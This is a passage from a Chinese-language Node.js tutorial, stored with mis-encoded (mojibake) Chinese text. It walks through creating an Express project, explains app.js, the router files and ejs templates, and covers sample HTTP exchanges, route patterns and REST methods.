è¯·æ±‚ï¼Œå¤„ç†åŽè¿”å›žå®¢æˆ·ç«¯ã€‚ PHPä¹‹æ‰€ä»¥è¿™ä¹ˆç®€å•ä¹Ÿæ˜¯å› ä¸ºå®ƒå¾ˆå¤šäº‹æƒ…éƒ½å°è£…å¥½äº†ï¼Œè€ŒNode.js çš„ http æ¨¡å—åˆ™æ˜¯åº•å±‚çš„æŽ¥å£ã€‚å°½ç®¡ä½¿ç”¨èµ·æ¥å¤åˆ¶ï¼Œä½†æ˜¯å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¯¹äºŽ HTTP åè®®çš„ç†è§£æ›´åŠ æ¸…æ™°ã€‚ å®žé™…ä¸Šï¼ŒNode.js è™½ç„¶æä¾›äº† http æ¨¡å—ï¼Œå´ä¸æ˜¯è®©ä½ ç›´æŽ¥ç”¨è¿™ä¸ªæ¨¡å—è¿›è¡Œ Web å¼€å‘çš„ã€‚http æ¨¡å—ä»…ä»…æ˜¯ä¸€ä¸ª HTTP æœåŠ¡å™¨å†…æ ¸çš„å°è£…ï¼Œä½ å¯ä»¥ç”¨å®ƒåšä»»ä½• HTTP æœåŠ¡å™¨èƒ½åšçš„äº‹æƒ…ï¼Œä¸ä»…ä»…æ˜¯åšä¸€ä¸ªç½‘ç«™ï¼Œç”šè‡³å®žçŽ°ä¸€ä¸ª HTTP ä»£ç†æœåŠ¡å™¨éƒ½è¡Œã€‚ä½ å¦‚æžœæƒ³ç”¨å®ƒç›´æŽ¥å¼€å‘ç½‘ç«™ï¼Œé‚£ä¹ˆå°±å¿…é¡»æ‰‹åŠ¨å®žçŽ°æ‰€æœ‰çš„ä¸œè¥¿äº†ï¼Œå°åˆ°ä¸€ä¸ª POST è¯·æ±‚ï¼Œå¤§åˆ° Cookieã€ä¼šè¯çš„ç®¡ç†ã€‚å½“ä½ ç”¨è¿™ç§æ–¹å¼å»ºæˆä¸€ä¸ªç½‘ç«™çš„æ—¶å€™ï¼Œä½ å°±å‡ ä¹Žå·²ç»åšå¥½äº†ä¸€ä¸ªå®Œæ•´çš„æ¡†æž¶äº†ã€‚ Express æ¡†æž¶npm æä¾›äº†å¤§é‡çš„ç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œå…¶ä¸­ Express æ˜¯ç›®å‰æœ€ç¨³å®šã€ä½¿ç”¨æœ€å¹¿æ³›ï¼Œè€Œä¸” Node.js å®˜æ–¹æŽ¨èçš„å”¯ä¸€ä¸€ä¸ª Web å¼€å‘æ¡†æž¶ã€‚Express é™¤äº†ä¸º http æ¨¡å—æä¾›äº†æ›´é«˜å±‚çš„æŽ¥å£å¤–ï¼Œè¿˜å®žçŽ°äº†è®¸å¤šåŠŸèƒ½ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼š è·¯ç”±æŽ§åˆ¶ æ¨¡æ¿è§£æžæ”¯æŒ åŠ¨æ€è§†å›¾ ç”¨æˆ·ä¼šè¯ CSRF ä¿æŠ¤ é™æ€æ–‡ä»¶æœåŠ¡ æ“ä½œæŽ§åˆ¶å™¨ è®¿é—®æ—¥å¿— ç¼“å­˜ æ’ä»¶æ”¯æŒ éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼ŒExpress ä¸æ˜¯ä¸€ä¸ªæ— æ‰€ä¸åŒ…çš„å…¨èƒ½æ¡†æž¶ï¼Œåƒ Rails æˆ– Django é‚£æ ·å®žçŽ°äº†æ¨¡æ¿å¼•æ“Žç”šè‡³ ORM ï¼ˆObject Relation Modelï¼Œå¯¹è±¡å…³ç³»æ¨¡åž‹ï¼‰ã€‚æž¶ï¼Œå¤šæ•°åŠŸèƒ½åªæ˜¯å¯¹ HTTP åè®®ä¸­å¸¸ç”¨æ“ä½œçš„å°è£…ï¼Œæ›´å¤šçš„åŠŸèƒ½éœ€è¦æ’ä»¶æˆ–è€…æ•´åˆå…¶ä»–æ¨¡å—æ¥å®Œæˆã€‚ ä¸‹é¢æ˜¯ ç”¨ Express é‡æ–°å®žçŽ°çš„å‰é¢çš„ä¾‹å­ 12345678var express = require('express');var app = express.createServer();app.use(express.bodyParser());app.all('/', function()&#123; res.send(req.body.title + req.body.text);&#125;);app.listen(3000); å¿«é€Ÿå¼€å§‹å®‰è£… Express1$ npm install -g express å®‰è£…å®ŒæˆåŽï¼Œ ä½¿ç”¨ express --help æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ 1234567891011121314151617181920C:\Users\Administrator&gt;express --help Usage: express [options] [dir] Options: --version output the version number -e, --ejs add ejs engine support --pug add pug engine support --hbs add handlebars engine support -H, --hogan add hogan.js engine support -v, --view &lt;engine&gt; add view &lt;engine&gt; support (dust|ejs|hbs|hjs|jade|pug|twig|vash) (defaults to jade) --no-view use static html instead of view engine -c, --css &lt;engine&gt; add stylesheet &lt;engine&gt; support (less|stylus|compass|sass) (defaults to plain css) --git add .gitignore -f, --force force on non-empty directory -h, --help output usage information Express åœ¨åˆå§‹åŒ–ä¸€ä¸ªé¡¹ç›®çš„æ—¶å€™éœ€è¦æŒ‡å®šæ¨¡æ¿å¼•æ“Žï¼Œé»˜è®¤æ”¯æŒJadeå’Œejsï¼Œä¸ºäº†é™ä½Žå­¦ä¹ éš¾åº¦æŽ¨èä½¿ç”¨ ejs ï¼ŒåŒæ—¶æš‚æ—¶ä¸æ·»åŠ  CSS å¼•æ“Žå’Œä¼šè¯æ”¯æŒã€‚ï¼ˆejs ï¼ˆEmbedded JavaScriptï¼‰ æ˜¯ä¸€ä¸ªæ ‡ç­¾æ›¿æ¢å¼•æ“Žï¼Œå…¶è¯­æ³•ä¸Ž ASPã€PHP ç›¸ä¼¼ï¼Œæ˜“äºŽå­¦ä¹ ï¼Œç›®å‰è¢«å¹¿æ³›åº”ç”¨ã€‚Express é»˜è®¤æä¾›çš„å¼•æ“Žæ˜¯ jadeï¼Œå®ƒé¢ è¦†äº†ä¼ ç»Ÿçš„æ¨¡æ¿å¼•æ“Žï¼Œåˆ¶å®šäº†ä¸€å¥—å®Œæ•´çš„è¯­æ³•ç”¨æ¥ç”Ÿæˆ HTML çš„æ¯ä¸ªæ ‡ç­¾ç»“æž„ï¼ŒåŠŸèƒ½å¼ºå¤§ä½†ä¸æ˜“å­¦ä¹ ã€‚ï¼‰ å»ºç«‹å·¥ç¨‹é€šè¿‡ä»¥ä¸‹å‘½ä»¤å»ºç«‹ç½‘ç«™åŸºæœ¬ç»“æž„ï¼š 1express -e microblog å½“å‰ç›®å½•ä¸‹å‡ºçŽ°äº†å­ç›®å½• microblogï¼Œå¹¶ä¸”äº§ç”Ÿäº†ä¸€äº›æ–‡ä»¶ï¼š 1234567891011121314151617181920212223242526272829F:\èµ–å½¬é¸¿\git-project\usual\LearnNodeJsCode\express&gt;express -e microblog warning: option `--ejs' has been renamed to `--view=ejs' create : microblog\ create : microblog\public\ create : microblog\public\javascripts\ create : microblog\public\images\ create : microblog\public\stylesheets\ create : microblog\public\stylesheets\style.css create : microblog\routes\ create : microblog\routes\index.js create : microblog\routes\users.js create : microblog\views\ create : microblog\views\error.ejs create : microblog\views\index.ejs create : microblog\app.js create : microblog\package.json create : microblog\bin\ create : microblog\bin\www change directory: &gt; cd microblog install dependencies: &gt; npm install run the app: &gt; SET DEBUG=microblog:* &amp; npm start æŒ‰ç…§æç¤ºè¿›å…¥ microblog æ–‡ä»¶å¤¹ï¼Œå®‰è£…ä¾èµ– ï¼Œæ‰“å¼€ ç›®å½•ä¸­çš„ package.json æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å…·ä½“çš„å†…å®¹ã€‚ 12345678910111213141516&#123; "name": "microblog", "version": "0.0.0", "private": true, "scripts": &#123; "start": "node ./bin/www" &#125;, "dependencies": &#123; "cookie-parser": "~1.4.3", "debug": "~2.6.9", "express": "~4.16.0", "http-errors": "~1.6.2", "jade": "~1.11.0", "morgan": "~1.9.0" &#125;&#125; å¯åŠ¨æœåŠ¡å™¨npm startå¯åŠ¨æœåŠ¡å™¨ï¼Œå¯ä»¥çœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼Œæ‰“å¼€ http://localhost:3000/ å·¥ç¨‹çš„ç»“æž„é™¤äº† package.jsonï¼Œå®ƒåªäº§ç”Ÿäº†ä¸‰ä¸ªä¸ª JavaScript æ–‡ä»¶ app.js ï¼Œ routes/index.jså’Œroutes/users.jsã€‚å¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œå°†è·¯ç”±è¿›è¡Œäº†åˆ†ç±»ï¼Œå…¶ä¸­users.js çš„æ˜¯è·¯ç”±çš„è·¯å¾„å‰ç¼€æœ‰userçš„ã€‚æ¨¡æ¿å¼•æ“Ž ejs ä¹Ÿæœ‰ä¸¤ä¸ªæ–‡ä»¶ index.ejs å’Œlayout.ejsï¼Œæ­¤å¤–è¿˜æœ‰æ ·å¼è¡¨ style.cssã€‚ app.js1234567891011121314151617181920212223242526272829303132333435363738394041var createError = require('http-errors');var express = require('express');var path = require('path');var cookieParser = require('cookie-parser');var logger = require('morgan');var indexRouter = require('./routes/index');var usersRouter = require('./routes/users');var app = express();// view engine setupapp.set('views', path.join(__dirname, 'views'));app.set('view engine', 'ejs');app.use(logger('dev'));app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(cookieParser());app.use(express.static(path.join(__dirname, 'public')));app.use('/', indexRouter);app.use('/users', usersRouter);// catch 404 and forward to error handlerapp.use(function(req, res, next) &#123; next(createError(404));&#125;);// error handlerapp.use(function(err, req, res, next) &#123; // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get('env') === 'development' ? err : &#123;&#125;; // render the error page res.status(err.status || 500); res.render('error');&#125;);module.exports = app; var indexRouter = require(â€˜./routes/indexâ€™); var usersRouter = require(â€˜./routes/usersâ€™); å¯ä»¥çœ‹å‡ºæ¥ express å°†è·¯ç”±åˆ†æˆäº†ä¸¤ä¸ªï¼Œå¹¶ä¸”è¿›è¡Œäº†å°è£…ï¼Œåœ¨ç›¸å¯¹åº”çš„é¡µé¢æ˜¯ç”¨ router.getåŽ»æ›¿æ¢æ•™ç¨‹ä¸­ app.getï¼Œç„¶åŽå†å°† router exports å‡ºæ¥ã€‚ app.set æ˜¯ Express çš„å‚æ•°è®¾ç½®å·¥å…·ï¼ŒæŽ¥å—ä¸€ä¸ªé”®ï¼ˆkeyï¼‰å’Œä¸€ä¸ªå€¼ï¼ˆvalueï¼‰ï¼Œå¯ç”¨çš„å‚æ•°å¦‚ä¸‹æ‰€ç¤ºã€‚ basepath ï¼šåŸºç¡€åœ°å€ï¼Œé€šå¸¸ç”¨äºŽ res.redirect() è·³è½¬ã€‚ views ï¼šè§†å›¾æ–‡ä»¶çš„ç›®å½•ï¼Œå­˜æ”¾æ¨¡æ¿æ–‡ä»¶ã€‚ view engine ï¼šè§†å›¾æ¨¡æ¿å¼•æ“Žã€‚ view options ï¼šå…¨å±€è§†å›¾å‚æ•°å¯¹è±¡ã€‚ view cache ï¼šå¯ç”¨è§†å›¾ç¼“å­˜ã€‚ case sensitive routes ï¼šè·¯å¾„åŒºåˆ†å¤§å°å†™ã€‚ strict routing ï¼šä¸¥æ ¼è·¯å¾„ï¼Œå¯ç”¨åŽä¸ä¼šå¿½ç•¥è·¯å¾„æœ«å°¾çš„â€œ / â€ã€‚ jsonp callback ï¼šå¼€å¯é€æ˜Žçš„ JSONP æ”¯æŒã€‚ routes/index.jså’Œroutes/users.jsroutes/index.jsä»¥åŠusers.js æ˜¯è·¯ç”±æ–‡ä»¶ï¼Œç›¸å½“äºŽæŽ§åˆ¶å™¨ï¼Œç”¨äºŽç»„ç»‡å±•ç¤ºçš„å†…å®¹ï¼š 1234567891011//index.js var express = require('express');var router = express.Router();/* GET home page. */router.get('/', function(req, res, next) &#123; res.render('index', &#123; title: 'Express' &#125;);&#125;);module.exports = router; 12345678910// users.jsvar express = require('express');var router = express.Router();/* GET users listing. */router.get('/', function(req, res, next) &#123; res.send('respond with a resource');&#125;);module.exports = router; ä¸¤ä¸ªæ–‡ä»¶çš„åŒºåˆ«åœ¨äºŽ users.js çš„è·¯ç”±å‰é¢è¿˜æœ‰ä¸ª usersçš„å‰ç¼€ï¼Œå³æ˜¯è®¿é—® http://localhost:3000/users ,æ‰å¯ä»¥çœ‹åˆ° respond with a resourceã€‚è¿™ä¸ªåœ¨ app.jsä¸­å¯ä»¥çœ‹å‡ºæ¥ã€‚ res.render(&#39;index&#39;, { title: &#39;Express&#39; }),åŠŸèƒ½æ˜¯è°ƒç”¨æ¨¡æ¿è§£æžå¼•æ“Žï¼Œç¿»è¯‘åä¸º index çš„æ¨¡æ¿ï¼Œå¹¶ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œè¿™ä¸ªå¯¹è±¡åªæœ‰ä¸€ä¸ªå±žæ€§ï¼Œå³ title: &#39;Express&#39; ã€‚ index.ejsndex.ejs æ˜¯æ¨¡æ¿æ–‡ä»¶ï¼Œå³ routes/index.js ä¸­è°ƒç”¨çš„æ¨¡æ¿ï¼Œå†…å®¹æ˜¯ï¼š 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt; &lt;link rel=&apos;stylesheet&apos; href=&apos;/stylesheets/style.css&apos; /&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt; &lt;p&gt;Welcome to &lt;%= title %&gt;&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; å®ƒçš„åŸºç¡€æ˜¯ HTML è¯­è¨€ï¼Œå…¶ä¸­åŒ…å«äº†å½¢å¦‚ &lt;%= title %&gt; çš„æ ‡ç­¾ï¼ŒåŠŸèƒ½æ˜¯æ˜¾ç¤ºå¼•ç”¨çš„å˜é‡ï¼Œå³ res.render å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥çš„å¯¹è±¡çš„å±žæ€§ã€‚ è·¯ç”±æŽ§åˆ¶å·¥ä½œåŽŸç†å½“é€šè¿‡æµè§ˆå™¨è®¿é—® app.js å»ºç«‹çš„æœåŠ¡å™¨æ—¶ï¼Œä¼šçœ‹åˆ°ä¸€ä¸ªç®€å•çš„é¡µé¢ï¼Œå®žé™…ä¸Šå®ƒå·²ç»å®Œæˆäº†è®¸å¤šé€æ˜Žçš„å·¥ä½œï¼ŒçŽ°åœ¨å°±æ¥è§£é‡Šä¸€ä¸‹å®ƒçš„å·¥ä½œæœºåˆ¶ï¼Œä»¥å¸®åŠ©ç†è§£ç½‘ç«™çš„æ•´ä½“æž¶æž„ã€‚è®¿é—® http://localhost:3000ï¼Œæµè§ˆå™¨ä¼šå‘æœåŠ¡å™¨å‘é€ä»¥ä¸‹è¯·æ±‚ï¼š 1234567891011GET / HTTP/1.1Host: localhost:3000Connection: keep-alivePragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: bdshare_firstime=1534228662871; scroll-cookie=0|/ å…¶ä¸­ç¬¬ä¸€è¡Œæ˜¯è¯·æ±‚çš„æ–¹æ³•ã€è·¯å¾„å’Œ HTTP åè®®ç‰ˆæœ¬ï¼ŒåŽé¢è‹¥å¹²è¡Œæ˜¯ HTTP è¯·æ±‚å¤´ã€‚ app ä¼šè§£æžè¯·æ±‚çš„è·¯å¾„ï¼Œè°ƒç”¨ç›¸åº”çš„é€»è¾‘ã€‚æœ€ç»ˆè§†å›¾æ¨¡æ¿ç”Ÿæˆ HTML é¡µé¢ï¼Œè¿”å›žç»™æµè§ˆå™¨ï¼Œè¿”å›žçš„å†…å®¹æ˜¯ï¼š 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Express&lt;/title&gt; &lt;link rel='stylesheet' href='/stylesheets/style.css' /&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Express&lt;/h1&gt; &lt;p&gt;Welcome to Express&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; æµè§ˆå™¨åœ¨æŽ¥æ”¶åˆ°å†…å®¹ä»¥åŽï¼Œç»è¿‡åˆ†æžå‘çŽ°è¦èŽ·å– /stylesheets/style.cssï¼Œå› æ­¤ä¼šå†æ¬¡å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ã€‚app.js ä¸­å¹¶æ²¡æœ‰ä¸€ä¸ªè·¯ç”±è§„åˆ™æŒ‡æ´¾åˆ° /stylesheets/style.cssï¼Œä½† app é€šè¿‡app.use(express.static(__dirname + &#39;/public&#39;)) é…ç½®äº†é™æ€æ–‡ä»¶æœåŠ¡å™¨ï¼Œå› æ­¤ /stylesheets/style.css ä¼šå®šå‘åˆ° app.js æ‰€åœ¨ç›®å½•çš„å­ç›®å½•ä¸­çš„æ–‡ä»¶ public/stylesheets/style.cssï¼Œå‘å®¢æˆ·ç«¯è¿”å›žä»¥ä¸‹ä¿¡æ¯ï¼š 12345678910111213141516171819HTTP/1.1 200 OKX-Powered-By: ExpressAccept-Ranges: bytesCache-Control: public, max-age=0Last-Modified: Fri, 21 Sep 2018 02:09:44 GMTETag: W/"6f-165f9e3dc52"Content-Type: text/css; charset=UTF-8Content-Length: 111Date: Fri, 21 Sep 2018 02:25:45 GMTConnection: keep-alivebody &#123; padding: 50px; font: 14px "Lucida Grande", Helvetica, Arial, sans-serif;&#125;a &#123; color: #00B7FF;&#125; ç”± Express åˆ›å»ºçš„ç½‘ç»œæž¶æž„å¦‚ä¸‹å›¾ è¿™æ˜¯ä¸€ä¸ªå…¸åž‹çš„ MVC æž¶æž„ï¼Œæµè§ˆå™¨å‘èµ·è¯·æ±‚ï¼Œç”±è·¯ç”±æŽ§åˆ¶å™¨æŽ¥å—ï¼Œæ ¹æ®ä¸åŒçš„è·¯å¾„å®šå‘åˆ°ä¸åŒçš„æŽ§åˆ¶å™¨ã€‚æŽ§åˆ¶å™¨å¤„ç†ç”¨æˆ·çš„å…·ä½“è¯·æ±‚ï¼Œå¯èƒ½ä¼šè®¿é—®æ•°æ®åº“ä¸­çš„å¯¹è±¡ï¼Œå³æ¨¡åž‹éƒ¨åˆ†ã€‚æŽ§åˆ¶å™¨è¿˜è¦è®¿é—®æ¨¡æ¿å¼•æ“Žï¼Œç”Ÿæˆè§†å›¾çš„ HTMLï¼Œæœ€åŽå†ç”±æŽ§åˆ¶å™¨è¿”å›žç»™æµè§ˆå™¨ï¼Œå®Œæˆä¸€æ¬¡è¯·æ±‚ã€‚ åˆ›å»ºè·¯ç”±è§„åˆ™å½“æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è®¿é—®è­¬å¦‚ http://localhost:3000/abc è¿™æ ·ä¸å­˜åœ¨çš„é¡µé¢æ—¶ï¼ŒæœåŠ¡å™¨ä¼šåœ¨å“åº”å¤´ä¸­è¿”å›ž 404 Not Found é”™è¯¯,è¿™æ˜¯å› ä¸º /abc æ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯ç”±è§„åˆ™ï¼Œè€Œä¸”å®ƒä¹Ÿä¸æ˜¯ä¸€ä¸ª public ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæ‰€ä»¥Expressè¿”å›žäº†404 Not Foundçš„é”™è¯¯ã€‚ å‡è®¾è¦åˆ›å»ºä¸€ä¸ªåœ°å€ä¸º /hello çš„é¡µé¢ï¼Œå†…å®¹æ˜¯å½“å‰çš„æœåŠ¡å™¨æ—¶é—´ï¼Œåœ¨ routes/index.js ä¸­åŠ ä¸€è¡Œ 123router.get('/hello', function(req, res, next) &#123; res.send('The time is ' + new Date().toString());&#125;); é‡å¯ app.jsï¼Œåœ¨æµè§ˆå™¨ä¸­è®¿é—® http://localhost:3000/hello ï¼Œå°±å¯ä»¥çœ‹åˆ°è¾“å‡ºçš„æ—¶é—´ã€‚åˆ·æ–°ç½‘é¡µçœ‹åˆ°æ—¶é—´çš„å˜åŒ–ï¼ŒåŒæ ·å¯ä»¥åœ¨ routes/users.js ä¸­æ·»åŠ ï¼Œé‚£å°±æ˜¯è¦è®¿é—® http://localhost:3000/users/hello . æœåŠ¡å™¨åœ¨å¼€å§‹ç›‘å¬ä¹‹å‰ï¼Œè®¾ç½®å¥½äº†æ‰€æœ‰çš„è·¯ç”±è§„åˆ™ï¼Œå½“è¯·æ±‚åˆ°è¾¾æ—¶ç›´æŽ¥åˆ†é…åˆ°å“åº”å‡½æ•°ã€‚routes.get æ˜¯è·¯ç”±è§„åˆ™åˆ›å»ºå‡½æ•°ï¼Œå®ƒæŽ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¯·æ±‚çš„è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå›žè°ƒå‡½æ•°ï¼Œè¯¥è·¯ç”±è§„åˆ™è¢«è§¦å‘æ—¶è°ƒç”¨å›žè°ƒå‡½æ•°ï¼Œå…¶å‚æ•°è¡¨ä¼ é€’ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯ reqï¼Œ res å’Œ nextï¼Œè¡¨ç¤ºè¯·æ±‚ä¿¡æ¯ï¼Œå“åº”ä¿¡æ¯å’Œnext()åœ¨å‡½æ•°ä½“å†…è°ƒç”¨ä»¥å°†æŽ§åˆ¶æƒäº¤ç»™ä¸‹ä¸€ä¸ªå›žè°ƒã€‚ è·¯å¾„åŒ¹é…ä¸Šé¢çš„ä¾‹å­æ˜¯ä¸ºå›ºå®šçš„è·¯å¾„è®¾ç½®è·¯ç”±è§„åˆ™ï¼ŒExpress è¿˜æ”¯æŒæ›´é«˜çº§çš„è·¯å¾„åŒ¹é…æ¨¡å¼ã€‚ä¾‹å¦‚æƒ³è¦å±•ç¤ºä¸€ä¸ªç”¨æˆ·çš„ä¸ªäººé¡µé¢ï¼Œè·¯å¾„ä¸º /users/[username]ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„æ–¹æ³•å®šä¹‰è·¯ç”±è§„åˆ™ï¼š 12345// router/users.jsrouter.get('/:username', function(req, res, next) &#123; res.send('user: ' + req.params.username);&#125;); ä¿®æ”¹ä»¥åŽé‡å¯ app.jsï¼Œè®¿é—® http://localhost:3000/users/lbhï¼Œ å¯ä»¥çœ‹åˆ°é¡µé¢æ˜¾ç¤ºäº†ä»¥ä¸‹å†…å®¹ï¼š user: lbh è·¯å¾„è§„åˆ™ /:username ä¼šè¢«è‡ªåŠ¨ç¼–è¯‘ä¸ºæ­£åˆ™è¡¨è¾¾å¼ï¼Œç±»ä¼¼äºŽ \/user\/([^\/]+)\/?è¿™æ ·çš„å½¢å¼ã€‚è·¯å¾„å‚æ•°å¯ä»¥åœ¨å“åº”å‡½æ•°ä¸­é€šè¿‡ req.params çš„å±žæ€§è®¿é—®ã€‚ è·¯å¾„è§„åˆ™åŒæ ·æ”¯æŒ JavaScript æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¾‹å¦‚ router.get(\/user\/([^\/]+)\/?,callback) ã€‚è¿™æ ·çš„å¥½å¤„åœ¨äºŽå¯ä»¥å®šä¹‰æ›´åŠ å¤æ‚çš„è·¯å¾„è§„åˆ™ï¼Œè€Œä¸åŒä¹‹å¤„æ˜¯åŒ¹é…çš„å‚æ•°æ˜¯åŒ¿åçš„ï¼Œå› æ­¤éœ€è¦é€šè¿‡ req.params[0] ã€ req.params[1] è¿™æ ·çš„å½¢å¼è®¿é—®ã€‚ REST é£Žæ ¼çš„è·¯ç”±è§„åˆ™Express æ”¯æŒ REST é£Žæ ¼çš„è¯·æ±‚æ–¹å¼ï¼ŒREST çš„æ„æ€æ˜¯ è¡¨å¾çŠ¶æ€è½¬ç§»ï¼ˆRepresentational State Transferï¼‰ï¼Œå®ƒæ˜¯ä¸€ç§åŸºäºŽ HTTP åè®®çš„ç½‘ç»œåº”ç”¨çš„æŽ¥å£é£Žæ ¼ï¼Œå……åˆ†åˆ©ç”¨ HTTP çš„æ–¹æ³•å®žçŽ°ç»Ÿä¸€é£Žæ ¼æŽ¥å£çš„æœåŠ¡ã€‚HTTP åè®®å®šä¹‰äº†ä»¥ä¸‹8ç§æ ‡å‡†çš„æ–¹æ³•ã€‚ GETï¼šè¯·æ±‚èŽ·å–æŒ‡å®šèµ„æºã€‚ HEADï¼šè¯·æ±‚æŒ‡å®šèµ„æºçš„å“åº”å¤´ã€‚ POSTï¼šå‘æŒ‡å®šèµ„æºæäº¤æ•°æ®ã€‚ PUTï¼šè¯·æ±‚æœåŠ¡å™¨å­˜å‚¨ä¸€ä¸ªèµ„æºã€‚ DELETEï¼šè¯·æ±‚æœåŠ¡å™¨åˆ é™¤æŒ‡å®šèµ„æºã€‚ TRACEï¼šå›žæ˜¾æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ï¼Œä¸»è¦ç”¨äºŽæµ‹è¯•æˆ–è¯Šæ–­ã€‚ CONNECTï¼šHTTP/1.1 åè®®ä¸­é¢„ç•™ç»™èƒ½å¤Ÿå°†è¿žæŽ¥æ”¹ä¸ºç®¡é“æ–¹å¼çš„ä»£ç†æœåŠ¡å™¨ã€‚ OPTIONSï¼šè¿”å›žæœåŠ¡å™¨æ”¯æŒçš„HTTPè¯·æ±‚æ–¹æ³•ã€‚ å…¶ä¸­æˆ‘ä»¬ç»å¸¸ç”¨åˆ°çš„æ˜¯ GETã€POSTã€PUT å’Œ DELETE æ–¹æ³•ã€‚æ ¹æ® REST è®¾è®¡æ¨¡å¼ï¼Œè¿™4ç§æ–¹æ³•é€šå¸¸åˆ†åˆ«ç”¨äºŽå®žçŽ°ä»¥ä¸‹åŠŸèƒ½ã€‚ GETï¼šèŽ·å– POSTï¼šæ–°å¢ž PUTï¼šæ›´æ–° DELETEï¼šåˆ é™¤ å®ƒä»¬çš„ç‰¹ç‚¹ è¯·æ±‚æ–¹å¼ å®‰ å…¨ å¹‚ ç­‰ GET æ˜¯ æ˜¯ POST å¦ å¦ PUT å¦ æ˜¯ DELETE å¦ æ˜¯ æ‰€è°“çš„å®‰å…¨æ˜¯æŒ‡æ²¡æœ‰å‰¯ä½œç”¨ï¼Œå³è¯·æ±‚ä¸ä¼šå¯¹èµ„æºäº§ç”Ÿå˜åŠ¨ï¼Œè¿žç»­è®¿é—®å¤šæ¬¡æ‰€èŽ·å¾—çš„ç»“æžœä¸å—è®¿é—®è€…çš„å½±å“ã€‚è€Œå¹‚ç­‰æŒ‡çš„æ˜¯é‡å¤è¯·æ±‚å¤šæ¬¡ä¸Žè¯·æ±‚ä¸€æ¬¡çš„æ•ˆæžœæ˜¯ä¸€æ ·çš„ï¼Œæ¯”å¦‚èŽ·å–å’Œæ›´æ–°æ“ä½œæ˜¯å¹‚ç­‰çš„ï¼Œè¿™ä¸Žæ–°å¢žä¸åŒã€‚åˆ é™¤ä¹Ÿæ˜¯å¹‚ç­‰çš„ï¼Œå³é‡å¤åˆ é™¤ä¸€ä¸ªèµ„æºï¼Œå’Œåˆ é™¤ä¸€æ¬¡æ˜¯ä¸€æ ·çš„ã€‚ Express å¯¹æ¯ç§ HTTP è¯·æ±‚æ–¹æ³•éƒ½è®¾è®¡äº†ä¸åŒçš„è·¯ç”±ç»‘å®šå‡½æ•°ï¼Œä¾‹å¦‚å‰é¢ä¾‹å­å…¨éƒ¨æ˜¯ router.get ï¼Œè¡¨ç¤ºä¸ºè¯¥è·¯å¾„ç»‘å®šäº† GET è¯·æ±‚ï¼Œå‘è¿™ä¸ªè·¯å¾„å‘èµ·å…¶ä»–æ–¹å¼çš„è¯·æ±‚ä¸ä¼šè¢«å“åº”ã€‚ ä¸‹è¡¨æ˜¯ Express æ”¯æŒçš„æ‰€æœ‰ HTTP è¯·æ±‚çš„ç»‘å®šå‡½æ•°ã€‚ï¼ˆæ²¡æœ‰å°è£…å‰ï¼‰ è¯·æ±‚æ–¹å¼ ç»‘å®šå‡½æ•° GET app.get(path, callback) POST app.post(path, callback) PUT app.put(path, callback) DELETE app.delete(path, callback) PATCH app.patch(path, callback) TRACE app.trace(path, callback) CONNECT app.connect(path, callback) OPTIONS app.options(path, callback) æ‰€æœ‰æ–¹æ³• app.all(path, callback) ç»‘å®šæŸä¸ªè·¯å¾„çš„ POST è¯·æ±‚ï¼Œåˆ™å¯ä»¥ç”¨ app.post(path, callback) çš„æ–¹æ³•ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ app.all å‡½æ•°ï¼Œå®ƒæ”¯æŒæŠŠæ‰€æœ‰çš„è¯·æ±‚æ–¹å¼ç»‘å®šåˆ°åŒä¸€ä¸ªå“åº”å‡½æ•°ï¼Œæ˜¯ä¸€ä¸ªéžå¸¸çµæ´»çš„å‡½æ•°ã€‚ æŽ§åˆ¶æƒè½¬ç§»Express æ”¯æŒåŒä¸€è·¯å¾„ç»‘å®šå¤šä¸ªè·¯ç”±å“åº”å‡½æ•°ï¼Œä¾‹å¦‚ï¼š 123456app.all('/user/:username', function(req, res) &#123; res.send('all methods captured');&#125;);app.get('/user/:username', function(req, res) &#123; res.send('user: ' + req.params.username);&#125;); ä½†å½“ä½ è®¿é—®ä»»ä½•è¢«è¿™ä¸¤æ¡åŒæ 